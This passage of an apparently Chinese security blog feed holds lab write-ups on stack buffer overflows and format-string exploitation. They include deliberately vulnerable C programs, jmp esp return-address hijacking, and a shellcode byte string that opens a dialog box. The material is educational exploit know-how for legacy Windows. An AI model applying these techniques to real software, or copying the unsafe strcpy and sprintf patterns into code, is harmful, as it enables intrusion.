<img data-src="/2019/10/26/experiments/security/software/stackOverflow/14.png" class=""></p>
</div></div><div class="tab-pane" id="overflow2-3"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/15.png" class=""> 
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/16.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/17.png" class=""></div></div></div>
<img data-src="/2019/10/26/experiments/security/software/stackOverflow/18.png" class=""> 
<div class="note info no-icon"><p>虽然也淹没了 <code>0x12fb20</code> 处的 <code>authenticated</code> 变量，但是我们输入的密码小于 <code>1234567</code>，<code>strcmp</code> 会返回 <code>-1</code>，<code>-1</code> 是用补码表示的，末尾的 <code>\0</code> 只可以淹没 <code>-1</code> 补码的后两位，程序不会向我们预想的方向走去。 <img data-src="/2019/10/26/experiments/security/software/stackOverflow/19.png" class=""></p>
</div></div></div></div>
<h3 id="淹没返回地址改变程序流程">淹没返回地址改变程序流程</h3>
<div class="note default"><p>为了方便调试，我们使用文件来输入 “密码”。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!fp=fopen(<span class="string">"password.txt"</span>,<span class="string">"rw+"</span>))</span><br><span class="line">{ </span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">} </span><br><span class="line"><span class="built_in">fscanf</span>(fp,<span class="string">"%s"</span>,password); </span><br><span class="line">valid_flag = verify_password(password); </span><br></pre></td></tr></tbody></table></figure></div>
<ol>
<li>找到输入点。这个地址跳转到 “验证成功” 的输出上。 <img data-src="/2019/10/26/experiments/security/software/stackOverflow/20.png" class=""></li>
<li>先填满 8 字节的 <code>buffer</code> 数组，4 字节的 <code>authenticated</code> 变量，4 字节的 ebp，接下来的 4 个字节我们就可以放上我们的返回地址。 <img data-src="/2019/10/26/experiments/security/software/stackOverflow/21.png" class=""></li>
<li>运行程序，显示 “验证成功”，但由于直接跳转地址破坏了栈平衡，程序崩溃。 <img data-src="/2019/10/26/experiments/security/software/stackOverflow/22.png" class=""> 此时的栈结构如此图所示 <img data-src="/2019/10/26/experiments/security/software/stackOverflow/23.png" class=""></li>
</ol>
<h2 id="测试结论">测试结论</h2>
<p>覆盖的过程中发生了什么？我认为可以用以下几张图来表示 </p><div class="tabs" id="res"><ul class="nav-tabs"><li class="tab active"><a href="#res-1">输入 qqqqqqqqrst 时</a></li><li class="tab"><a href="#res-2">输入 qqqqqqqq 时</a></li><li class="tab"><a href="#res-3">输入 01234567 时</a></li><li class="tab"><a href="#res-4">覆盖返回地址时</a></li></ul><div class="tab-content"><div class="tab-pane active" id="res-1"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E8%A6%86%E7%9B%961.png" class=""></div><div class="tab-pane" id="res-2"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E8%A6%86%E7%9B%962.png" class=""></div><div class="tab-pane" id="res-3"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E8%A6%86%E7%9B%963.png" class=""></div><div class="tab-pane" id="res-4"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E8%A6%86%E7%9B%964.png" class=""></div></div></div> 两种溢出方法都是比较“危险”的，一旦被利用，会造成意想不到的后果。轻则引起程序崩溃，重则引发安全漏洞。<p></p>
<h2 id="思考题">思考题</h2>
<p>程序的源码如下</p>
<figure class="highlight c"><figcaption><span>stackOverrun.c</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  StackOverrun.c</span></span><br><span class="line"><span class="comment">  This program shows an example of how a stack-based</span></span><br><span class="line"><span class="comment">  buffer overrun can be used to execute arbitrary code.  Its</span></span><br><span class="line"><span class="comment">  objective is to find an input string that executes the function bar().</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* input)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//What? No extra arguments supplied to printf?</span></span><br><span class="line">    <span class="comment">//It's a cheap trick to view the stack 8-)</span></span><br><span class="line">    <span class="comment">//We'll see this trick again when we look at format strings.</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"My stack looks like:\n%p\n%p\n%p\n%p\n%p\n% p\n%p\n%p\n%p\n%p\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Pass the user input straight to secure code public enemy #1.</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, input);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now the stack looks like:\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Augh! I've been hacked!\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">//Blatant cheating to make life easier on myself</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Address of foo = %p\n"</span>, foo);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Address of bar = %p\n"</span>, bar);</span><br><span class="line"></span><br><span class="line">    foo(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>本次的目标是通过栈溢出，想办法使 <code>bar</code> 函数得到执行。</p>
<div class="tabs" id="solution"><ul class="nav-tabs"><li class="tab active"><a href="#solution-1">解法一</a></li><li class="tab"><a href="#solution-2">解法二</a></li></ul><div class="tab-content"><div class="tab-pane active" id="solution-1"><ol>
<li>
<p>程序通过命令行参数执行了 <code>foo</code> 函数，在 <code>foo</code> 函数中，有一个 10 个字节长的 <code>buf</code> 字符数组，在第 14 行中发生了未经检查的无界向有界拷贝的行为，很容易引发溢出。分析到这里，思路就很简单了：参数中先用任意字符填满 <code>buf</code><br>
，然后再填入 4 字节的 <code>bar</code> 函数的地址。</p>
</li>
<li>
<p>先调试，填上一个较短的参数看看发生了什么</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%981.png" class="" title="填入参数3344"></div><div class="group-picture-column"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%982.png" class="" title="运行"></div></div></div>
</li>
<li>
<p>发现我们给的这个参数在 DS 段中存储着，而且运行时程序会打印出 <code>foo</code> 和 <code>bar</code> 函数的地址值。所以 <code>bar</code> 函数地址我们已经有了。</p>
</li>
<li>
<p>我们的命令行参数从 DS 段拷贝到了 <code>0x12ff60</code> 的位置。</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%983.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%984.png" class=""></div></div></div>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%985.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%986.png" class=""></div></div></div>
</li>
<li>
<p>构造 payload 时要注意考虑到内存的对齐因素，缓冲区是 10 个字节长没错，但是填充时要淹没掉 <code>0x40109b</code> 的返回地址值，又要使最后 4 个字节为 <code>bar</code> 函数的地址值，所以要填上 12 个任意字符。综合考虑，构造 payload 如下。<br>
<img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%987.png" class=""></p>
</li>
<li>
<p>把这个值复制到调试命令行中，重启程序 <img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%988.png" class=""></p>
</li>
<li>
<p>此时已经可以看到 <code>0x12ff6c</code> 中存储的返回地址值变成了 <code>0x401060</code>。前面的 <code>0x12ff60~0x12ff68</code> 也已悉数占满。<br>
<img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%989.png" class=""> <img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%9810.png" class=""></p>
</li>
<li>
<p>按<kbd> F8</kbd> 单步跟下来，可以发现程序紧接着跳到了 <code>0x401060</code>，<code>bar</code> 函数的地址，目标达到了。紧接着程序就因为栈不平衡而崩溃了。</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%9811.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%9812.png" class=""></div></div></div>
 <img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%98%E6%9C%80%E7%BB%88.png" class="" title="命令行运行结果">
</li>
<li>
<p>覆盖返回地址法利用全过程图示 <img data-src="/2019/10/26/experiments/security/software/stackOverflow/1571749477979.jpg" class="" title="图中红笔为溢出执行过程"></p>
</li>
</ol></div><div class="tab-pane" id="solution-2"><p>接下来，我们使用 <code>jmp esp</code> 的方法来完成程序的破解。</p>
<ol>
<li>
<p>使用 od 自带的插件 overflow return address 寻找可用的 <code>jmp esp</code> 地址，查找结果如下</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%982-1.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%982-2.png" class=""></div></div></div>
</li>
<li>
<p>本次实验选用了一个位于 <code>ntdll.text</code> 段的 <code>jmp esp</code>，地址为 <code>77f8948bh</code>。</p>
<p>根据 <code>jmp esp</code> 构造相关知识，构造 payload 为 12 个填充字符 "a"+<code>jmp esp</code> 地址 <code>0x77f8948b</code>（大端书写）+shellcode（<code>call bar()</code> 的机器码）。下面简单看一下运行该参数之后，栈的情况。<br>
<img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%982-3.png" class="" title="payload图示"></p>
</li>
<li>
<p><code>foo</code> 和 <code>bar</code> 的地址输出等同于方法一</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%982-4.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%982-5.png" class=""></div></div></div>
</li>
<li>
<p>将命令行的内容复制到缓冲区时，观察输出，可以发现 <code>0x12ff6c</code> 被覆盖成了 <code>jmp esp</code> 的地址 <img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%982-6.png" class="" title="而临接地址的内容，就是本次我们要执行的shellcode"></p>
</li>
<li>
<p>在函数 <code>return</code> 之前，注意到它即将返回到一个内核地址 <code>77f8948b</code><br>
<img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%982-7.png" class=""></p>
</li>
<li>
<p>陷入内核的一瞬间，可以看到 <code>eip</code> 指针所指向的位置上，命令为 <code>jmp esp</code>。观察右侧知 <code>esp</code> 现在的值为 <code>12ff70h</code>，接下来，程序到 <code>12ff70h</code> 执行内容。 <img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%982-8.png" class=""></p>
</li>
<li>
<p>跳转到 <code>12ff70</code> 地址后，其中所写入的数据都被当作指令来执行，我们的 shellcode 被成功解析为了 <code>call</code> 指令。 <img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%982-9.png" class=""></p>
</li>
<li>
<p>果然它紧接着调用了 <code>00401060</code> 处的 <code>bar</code> 函数。 <img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%982-10.png" class=""></p>
</li>
<li>
<p>调用完成后，它返回了 <code>12ff70</code> 处，然后继续向下执行指令，直到崩溃。 <img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%982-11.png" class=""></p>
 <div class="note warning"><p>如果没有任何中断的话，接下来地址的所有的 hex 数据都会按照命令来执行，相当危险……</p>
</div></li>
</ol>
</div>
<ol start="10">
<li>
<p>刚才执行的过程中成功产生预期输出。 <img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%982-12.png" class=""></p>
</li>
<li>
<p>刚才的 payload 可以正常在命令行中传参执行，成功触发 <code>bar</code> 函数。 <img data-src="/2019/10/26/experiments/security/software/stackOverflow/%E6%80%9D%E8%80%83%E9%A2%98%E6%96%B9%E6%B3%95%E4%BA%8C%E6%9C%80%E7%BB%88.png" class=""></p>
</li>
<li>
<p><code>jmp esp</code> 法利用全过程图示 <img data-src="/2019/10/26/experiments/security/software/stackOverflow/1572080943051.jpg" class="" title="图中红笔为溢出执行过程"></p>
</li>
</ol></div></div>
]]></content>
      <categories>
        <category>实验</category>
        <category>软件安全</category>
        <category>漏洞</category>
        <category>栈溢出</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>软件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串</title>
    <url>/2019/12/25/experiments/security/software/string-format/</url>
    <content><![CDATA[<h2 id="目标">目标</h2>
<p>通过几个例子来理解格式化输出函数漏洞的利用，使用 <code>%s</code>、<code>%x</code>、<code>%n</code> 格式操作符操作内存，完成给定 shellcode 调用。</p>
<span id="more"></span>
<h2 id="测试步骤与结果">测试步骤与结果</h2>
<h3 id="code-x-code-查看栈内容"><code>%x</code> 查看栈内容</h3>
<p>代码如下</p>
<figure class="highlight c"><figcaption><span>stackView.c</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">	<span class="type">char</span> format[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(format,<span class="string">"%08x.%08x.%08x.%08x"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(format,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>执行 <code>printf</code> 时，第四个 <code>%x</code> 没有提供相应的参数，会显示该参数所在位置的栈内容。在本例为 <code>00132588h</code><img data-src="/2019/12/25/experiments/security/software/string-format/1.png" class="">
</li>
<li>此程序输出如下 <img data-src="/2019/12/25/experiments/security/software/string-format/2.png" class=""></li>
</ul>
<h3 id="code-s-code-查看指定地址内容"><code>%s</code> 查看指定地址内容</h3>
<p>代码如下</p>
<figure class="highlight c"><figcaption><span>memoryView.c</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">	<span class="type">char</span> format[<span class="number">40</span>];</span><br><span class="line">	<span class="comment">//利用多个%x将%s对应的参数位置挪到存储地址77E61044的栈地址</span></span><br><span class="line">	<span class="built_in">strcpy</span>(format,<span class="string">"\x44\x10\xE6\x77%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%s"</span>);</span><br><span class="line">	<span class="comment">//输出地址0x77E61044的内存</span></span><br><span class="line">	<span class="built_in">printf</span>(format,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>代码将要查看位于地址 <code>0x77E61044</code> 的内存内容。</li>
<li>前 3 个参数为提供的 3 个参数，后面的一群 <code>%x</code> 是为了将 <code>%s</code> 的参数对应到地址 <code>0x77e61044</code> 上，所以可以输出内存 <code>0x77e61044</code> 的内容直到遇到截断符。  <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/25/experiments/security/software/string-format/3.png" class=""></div><div class="group-picture-column"><img data-src="/2019/12/25/experiments/security/software/string-format/4.png" class=""></div></div></div>
  <img data-src="/2019/12/25/experiments/security/software/string-format/5.png" class="" title="内存0x77e61044的内容">
</li>
<li>该段程序输出如下 <img data-src="/2019/12/25/experiments/security/software/string-format/6.png" class=""></li>
</ul>
<h3 id="实际操作对格式化输出函数漏洞进行利用">实际操作对格式化输出函数漏洞进行利用</h3>
<ol>
<li>
<p><code>sprintf()</code> 函数</p>
<ul>
<li><code>sprintf</code> 的函数原型是这样的：<code>int sprintf (char *buffer, const char *format, [argument] ...);</code>
<ul>
<li><code>buffer</code> 指针指向将要写入字符串的缓冲区</li>
<li><code>format</code> 格式化字符串</li>
<li><code>argument</code> 为可选参数</li>
</ul>
</li>
<li><code>sprintf</code> 函数的漏洞点在于它假定任意长度的缓冲区存在。</li>
</ul>
</li>
<li>
<p>shellcode 解析</p>
 <figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">char</span> user[]=</span><br><span class="line"><span class="string">"%497d\x39\x4a\x42\x00"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x33\xDB\x53\x68\x62\x75\x70\x74\x68\x62\x75\x70\x74\x8B\xC4\x53"</span></span><br><span class="line"><span class="string">"\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\xB8\xBB\xB0\xE7\x77\xFF\xD0\x90\x90\x90\x90"</span>;</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>我们使用数组 <code>user</code> 作为用户的 “输入”，<code>\x39\x4a\x42\x00</code> 为 shellcode 的起始地址，用来覆盖函数的返回地址。<code>\x33\xdb</code> 开始是我们的弹框 shellcode。当调用 <code>sprintf</code> 时，它会读取一个参数以 <code>%497d</code> 的格式写入 outbuf，由于未提供该参数，会自动将栈地址 <code>0x0012fae0</code> 中的值视为该参数，即 <code>0x12ff80</code>。需要写入 <code>outbuf</code> 的总字符串长度为 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="14.833ex" height="1.717ex" role="img" focusable="false" viewBox="0 -677 6556 759"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(1222.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(2222.4,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(500,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(1000,0)"></path></g><g data-mml-node="mo" transform="translate(4000.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(5056,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(1000,0)"></path></g></g></g></svg></mjx-container> ，而 <code>outbuf</code> 长度为 <code>512</code>，因此会导致栈溢出，使得函数的返回后执行 <code>sprintf()</code> 后 <code>outbuf</code> 的内容。</li>
</ul>
</li>
<li>
<p>漏洞利用</p>
<ul>
<li>
<p>整体代码如下</p>
  <figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"> <span class="comment">// libraries import omitted </span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">mem</span><span class="params">()</span>{ </span><br><span class="line">   <span class="comment">//__asm int 3 </span></span><br><span class="line">   <span class="type">char</span> outbuf[<span class="number">512</span>]; </span><br><span class="line">   <span class="type">char</span> buffer[<span class="number">512</span>]; </span><br><span class="line">   <span class="built_in">sprintf</span>(</span><br><span class="line">  buffer,</span><br><span class="line">  <span class="string">"ERR Wrong command: %.400s"</span>, user</span><br><span class="line">); <span class="comment">/* 执行完上一步后buffer[]="ERR Wrong command: %497d\x39\x4a\x42\x00" 00424a39为shellcode地址；此处仅仅就是一串nop而已 */</span> </span><br><span class="line">   <span class="built_in">sprintf</span>(outbuf,buffer); </span><br><span class="line">   <span class="comment">//sprintf(outbuf,"ERR Wrong command: %497d\x39\x4a\x42\x00"); </span></span><br><span class="line"> }</span><br><span class="line"> <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{ </span><br><span class="line">   LoadLibrary(<span class="string">"user32.dll"</span>); </span><br><span class="line">   mem(); </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line"> } </span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p><code>mem</code> 函数中，分配了两个 <code>512</code> 字节大小的缓冲区，并进行了两次 <code>sprintf</code> 操作。</p>
</li>
<li>
<p>第一次 <code>sprintf</code> 后，<code>buffer</code>（在 <code>0x424a30</code>）中的内容应该是 <code>"ERR Wrong command: %497d\x39\x4a\x42\x00"</code>，其后的内容因为有 <code>0x00</code> 而被截断。</p>
  <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/25/experiments/security/software/string-format/7.png" class=""></div><div class="group-picture-column"><img data-src="/2019/12/25/experiments/security/software/string-format/8.png" class=""></div></div></div>
</li>
<li>
<p>第二次执行 <code>sprintf</code>，它会读取一个参数以 <code>%497d</code> 的格式写入 <code>outbuf</code>，由于未提供该参数，会自动将栈地址 <code>0x0012fae0</code> 中的值视为该参数，即 <code>0x12ff80</code>。</p>
  <img data-src="/2019/12/25/experiments/security/software/string-format/9.png" class="">
</li>
<li>
<p><code>outbuf</code> 起始地址为 <code>0x0012fd2c</code>, 19 字节的字符串 <code>ERR Wrong command: </code>后为 497 字节的整型数字 <code>1245056</code>，因此从 <code>0012ff30</code> 开始为 <code>\x39\x4a\x42\x00</code>。</p>
  <img data-src="/2019/12/25/experiments/security/software/string-format/11.png" class="">
</li>
<li>
<p>我们成功将返回地址 <code>0x4010d1</code> 覆盖为 shellcode 的地址 <code>0x424a39</code>。</p>
  <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/25/experiments/security/software/string-format/10-ori.png" class="" title="修改前"></div><div class="group-picture-column"><img data-src="/2019/12/25/experiments/security/software/string-format/10-changed.png" class="" title="修改后"></div></div></div>
</li>
<li>
<p>shellcode 成功执行，弹出对话框。 <img data-src="/2019/12/25/experiments/security/software/string-format/12.png" class=""></p>
</li>
</ul>
</li>
</ol>
<h2 id="测试结论">测试结论</h2>
<p>上述溢出程序的修改原理可以用这个图来简单表示。</p>
<img data-src="/2019/12/25/experiments/security/software/string-format/IMG_20191225_120713.jpg" class="">
<h2 id="思考题">思考题</h2>
<p>源代码如下</p>
<figure class="highlight c++"><figcaption><span>foo.cpp</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*ErrFunc)</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GhastlyError</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> err)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Unrecoverable error! - err = %d\n"</span>, err);</span><br><span class="line">    <span class="comment">//This is, in general, a bad 